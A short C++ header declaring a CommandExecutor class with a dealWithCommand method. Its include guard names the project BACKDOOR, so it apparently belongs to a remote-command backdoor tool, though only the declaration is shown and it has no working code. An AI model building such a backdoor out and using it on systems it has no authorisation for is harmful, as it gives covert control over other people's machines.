//
// Created by stdout on 2021/4/5.
//

#ifndef BACKDOOR_COMMANDEXECUTOR_H
#define BACKDOOR_COMMANDEXECUTOR_H

#include "string"
#include "../Utils/BindUtils.h"

class CommandExecutor {
public:
    static int BufferSize;
    static dktb::BUFFER *dealWithCommand(char* command, char* args);
};


#endif //BACKDOOR_COMMANDEXECUTOR_H
